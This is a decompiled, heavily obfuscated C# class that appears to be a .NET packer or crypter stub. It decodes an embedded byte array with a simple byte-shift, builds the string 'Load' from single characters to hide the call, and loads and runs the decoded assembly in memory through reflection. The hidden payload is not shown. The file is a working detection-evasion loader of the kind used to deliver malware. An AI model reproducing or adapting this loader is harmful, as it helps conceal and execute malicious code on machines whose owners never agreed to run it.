using System;
using System.Reflection;
using ns2;
using ns4;
using ns6;

namespace ns8;

internal sealed class Class5
{
	internal delegate void Delegate0();

	internal sealed class Class6
	{
		internal static Assembly smethod_0(object A_0, ResolveEventArgs A_1)
		{
			return null;
		}
	}

	internal static Assembly assembly;

	internal static char[] char_0;

	internal static void smethod_0()
	{
		int num = 0;
		int num2 = default(int);
		byte[] array = default(byte[]);
		MethodInfo methodInfo = default(MethodInfo);
		char[] values = default(char[]);
		string name = default(string);
		int i = default(int);
		object obj;
		while (true)
		{
			if (num != 12)
			{
				goto IL_0007;
			}
			switch (num2)
			{
			case 0:
			case 3:
				break;
			case 1:
			case 2:
				goto IL_0103;
			default:
				goto IL_016e;
			}
			goto IL_00ee;
			IL_00ee:
			if (smethod_2(array) != 0)
			{
				num = 15;
				goto IL_0055;
			}
			goto IL_008d;
			IL_016e:
			num = 13;
			goto IL_0007;
			IL_0007:
			if (num == 11)
			{
				methodInfo = null;
				num = 12;
			}
			if (num == 8)
			{
				values = new char[4] { 'L', 'o', 'a', 'd' };
				num = 9;
			}
			if (num != 7)
			{
				goto IL_0034;
			}
			goto IL_00b1;
			IL_0055:
			if (num == 10)
			{
				num2 = 0;
				num = 11;
			}
			if (num != 13)
			{
				if (num != 4)
				{
					goto IL_0071;
				}
				goto IL_00bc;
			}
			goto IL_0103;
			IL_0071:
			if (num != 15)
			{
				goto IL_007b;
			}
			goto IL_0103;
			IL_0103:
			methodInfo = typeof(Assembly).GetMethod(name, new Type[1] { typeof(byte[]) });
			num = 16;
			goto IL_007b;
			IL_007b:
			if (num == 2)
			{
				i = 0;
				num = 3;
			}
			if (num == 16)
			{
				goto IL_008d;
			}
			goto IL_009c;
			IL_00b1:
			if (!smethod_1(i, array))
			{
				num = 8;
				goto IL_0034;
			}
			goto IL_00bc;
			IL_009c:
			if (num == 1)
			{
				array = Class2.smethod_0();
				num = 2;
			}
			if (num != 3)
			{
				if (num == 9)
				{
					name = string.Join("", values);
					num = 10;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 17)
				{
					obj = null;
					break;
				}
				continue;
			}
			goto IL_00b1;
			IL_0034:
			if (num != 6)
			{
				goto IL_003d;
			}
			goto IL_00c9;
			IL_00c9:
			smethod_4(ref i);
			num = 7;
			goto IL_003d;
			IL_003d:
			if (num == 5)
			{
				array[i] = (byte)(array[i] - 12 - 8);
				num = 6;
			}
			if (num != 14)
			{
				goto IL_0055;
			}
			goto IL_00ee;
			IL_008d:
			if (!(methodInfo != null))
			{
				num = 17;
				goto IL_009c;
			}
			obj = methodInfo.Invoke(null, new object[1] { array });
			break;
			IL_00bc:
			if (smethod_3(i))
			{
				num = 5;
				goto IL_0071;
			}
			goto IL_00c9;
		}
		assembly = (Assembly)obj;
		if (!(assembly != null))
		{
			return;
		}
		try
		{
			if (i == smethod_2(array))
			{
				Class0.smethod_0();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			Console.ReadLine();
		}
	}

	private static bool smethod_1(int i, byte[] array)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		return i < smethod_2(array);
	}

	internal static int smethod_2(byte[] array)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		return array.Length;
	}

	private static bool smethod_3(int i)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		return i % 5 / 3 == 0;
	}

	private static void smethod_4(ref int i)
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				i++;
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
	}

	static Class5()
	{
		Class3.smethod_0();
	}
}
